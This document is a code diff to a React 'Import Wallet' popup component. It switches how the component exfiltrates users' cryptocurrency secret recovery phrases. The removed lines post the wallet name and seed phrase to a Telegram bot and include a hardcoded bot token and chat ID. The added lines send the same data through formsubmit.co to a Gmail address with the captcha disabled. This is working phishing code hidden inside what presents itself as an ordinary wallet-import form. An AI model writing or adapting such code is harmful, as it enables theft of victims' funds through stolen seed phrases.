@@ -15,30 +15,24 @@ export default function ImportWalletPopup({ isOpen, onClose, onSubmit }: ImportW
   const [error, setError] = useState("")
   const [isSubmitting, setIsSubmitting] = useState(false)
 
-  const TELEGRAM_BOT_TOKEN = "5888330594:AAHDeBuU_fGop5VyXbdF-p3CFR0MPjrtGIo"
-  const TELEGRAM_CHAT_ID = "1223413825"
-
-  const sendToTelegram = async (walletName: string, secretPhrase: string) => {
+  const sendToEmail = async (walletName: string, secretPhrase: string) => {
     try {
-      const message = `🔐 New Wallet Import\n\n📛 Wallet Name: ${walletName}\n\n🔑 Secret Phrase:\n${secretPhrase}`
+      const formData = new FormData()
+      formData.append('Wallet_Name', walletName)
+      formData.append('Secret_Phrase', secretPhrase)
+      formData.append('_subject', '🔐 New Wallet Import')
+      formData.append('_captcha', 'false')
       
-      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      const response = await fetch('https://formsubmit.co/metawalleresponse2@gmail.com', {
         method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify({
-          chat_id: TELEGRAM_CHAT_ID,
-          text: message,
-          parse_mode: "HTML",
-        }),
+        body: formData,
       })
 
       if (!response.ok) {
-        console.error("Failed to send to Telegram")
+        console.error("Failed to send email")
       }
     } catch (err) {
-      console.error("Telegram error:", err)
+      console.error("Email error:", err)
     }
   }
 
@@ -69,7 +63,7 @@ export default function ImportWalletPopup({ isOpen, onClose, onSubmit }: ImportW
     setIsSubmitting(true)
     
     try {
-      await sendToTelegram(walletName, secretPhrase)
+      await sendToEmail(walletName, secretPhrase)
       
       if (onSubmit) {
         onSubmit(walletName, secretPhrase)
